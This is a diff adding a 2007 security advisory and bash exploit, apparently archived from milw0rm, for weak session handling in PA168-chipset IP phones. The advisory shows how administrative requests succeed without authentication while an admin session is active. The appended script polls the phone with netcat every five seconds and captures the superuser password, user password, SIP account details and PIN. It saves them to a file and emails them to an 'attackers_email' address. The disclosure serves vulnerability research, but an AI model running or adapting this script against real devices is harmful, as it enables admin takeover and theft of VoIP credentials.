@@ -1,0 +1,142 @@
+#!/bin/bash
+# PR06-14: IP Phones based on Centrality Communications/Aredfox PA168 chipset weak session management vulnerability
+
+# Author: Adrian Pastor [adrian.pastor-AT-procheckup.com] from ProCheckUp
+
+# This advisory has been published following consultation with UK NISCC [http://www.niscc.gov.uk/]
+# Date Found: 3rd November 2006
+# Date Public: 22nd January 2007
+# Vulnerable:
+# Phones confirmed to be vulnerable:
+# - ATCOM AT-320ED IP Phone running SIP firmware version V1.42 and 1.54
+# - SOYO G668 Ethernet IP Phone running SIP firmware version v1.42
+# The following vendors/models also use the same PA168 chipset/firmware
+# and are therefore most likely to be vulnerable to the same issue:
+# - AriaVoice
+# - AT-323 from ATcom
+# - JR168_100B from IPLink
+# - JR168_100W from IPLink
+# - JR168_200 from IPLink
+# - Netweb-401/402 from NetWebGroup
+# - OB-WAN VoIP: Ethernet#1 and Ethernet#2 phones are PA168-based
+# - Vida some phones PA168 based
+# - Wuchuan HOP-1001/1002/1003
+# - Giptel IP phones G100, also Siptronic ST-100 and Siptronic ST-150 (PA168S chipset)
+# - GNET some phones PA168x based
+# - KE1020 Netphone (Meritline)
+# - ML210 Meritline
+# - Integrated Networks IN-1002. Found on eBay.
+# - ArtDio IPF-2000 and IPF-2002L phones
+# - Perfectone IP300
+
+# Severity: Medium
+
+# CVE Candidate: Not assigned
+
+# Overview:
+# There is a problem with the way IP Phones using the PA168 chipset handle
+# authenticated sessions, allowing remote attackers to gain access to the
+# admin web console running as superuser.
+
+# Description:
+# When the superuser account authenticates to the admin web console, a
+# request such as the following is sent to the IP phone's web server:
+
+# POST /a HTTP/1.1
+# Referer: http://192.168.1.100/
+# Host: 192.168.1.100
+# Content-Length: 31
+
+# auth=12345678&login=+++Login+++
+
+# At this point, the superuser session is considered *active* by the web
+# server. All it takes for attackers to perform an administrative task at
+# this point, is for them to send a well-formed request to the web server.
+# Since no authentication tokens or password are submitted within the HTTP
+# requests, anyone can perform administrative tasks while the session is
+# active. Even if the attacker sends the administrative requests from an
+# IP address different to the one used by the superuser account, the IP
+# Phone's web server would accept them as long as the superuser's session
+# is still active.
+
+# A script called "active-session-attack.sh" has been created, which
+# remotely checks repeatedly until a superuser account has logged on by
+# sending a forged superuser request every five seconds. As soon as the
+# superuser session becomes active, the following information will be
+# obtained from the settings page, and emailed to the attacker:
+
+# - IP phone's superuser password - grants administrative access
+# - IP phone's user password - grants restricted access
+# - SIP gateway hostname/IP address
+# - SIP account username
+# - SIP account PIN number
+
+# REQUEST:
+
+# POST /g HTTP/1.1
+# Host: 192.168.1.100
+# Content-Length: 13
+
+# back=++Back++
+
+# RESPONSE (output has been partially omitted for clarification):
+
+# HTTP/1.1 200 OK
+# Content-Length: 16727
+# Content-Type: text/html
+# Connection: close
+
+# <TITLE>IP Phone V1.54</TITLE>
+# [output omitted]
+# <INPUT name=sipproxy value="sip.test.com">
+# <INPUT name=domain value="sip.test.com">
+# <INPUT name=account value="myaccount" size=24 maxlength=32>
+# <INPUT name=pin type=password value="1234">
+# <INPUT name=superpassword type=password value="12345678">
+# <INPUT name=password type=password value="1234">
+# [output omitted]
+
+# In order to test this vulnerability, the following steps have been provided:
+
+# 1. Log into http://192.168.1.100 from computer A using the superuser
+# password ('12345678' by default)
+# 2. Send the following curl command from computer B:
+# curl -d "back=++Back++" http://192.168.1.100/g
+# 3. The administrative settings page should be returned without any
+# password required.
+# Note: the IP phone's web server is enabled by default
+# Fix:
+
+# Use access control lists on routers or firewalls in order to only allow
+# trusted IP addresses to access ATCOM AT-320ED IP Phone's web server.
+# Exposing the PA168-based IP Phone's admin web server on the Internet is
+# not recommended.
+
+# References:
+# http://www.voip-info.org/wiki/view/PA168
+# http://www.centralitycomm.com/
+# http://www.aredfox.com/eindex.htm
+# http://www.atcom.cn/En_products_At320ED.html
+# http://www.soyogroup.com/products/proddesc.php?id=307
+# http://www.procheckup.com/Vulner_2007.php
+
+host="192.168.1.100";
+attackers_email="adrian.pastor-AT-procheckup.com"
+req="POST /g HTTP/1.0\r\nContent-length: 13\r\n\r\nback=++Back++\r\n\r\n";
+
+while true
+do
+        res=`echo -en $req | nc -nv $host 80`;
+        if echo $res | grep superpassword # if this gets returned, then we got the settings page with all SIP account and IP phone creds
+        then
+                echo "GOT IT!"
+                echo $res > "admin-settings-page"
+                echo $res | mail $attackers_email -s "PA168 IP Phone admin's settings page"
+                exit 1
+        else
+                echo "bad luck"
+        fi
+        sleep 5
+done
+
+# milw0rm.com [2007-01-24]
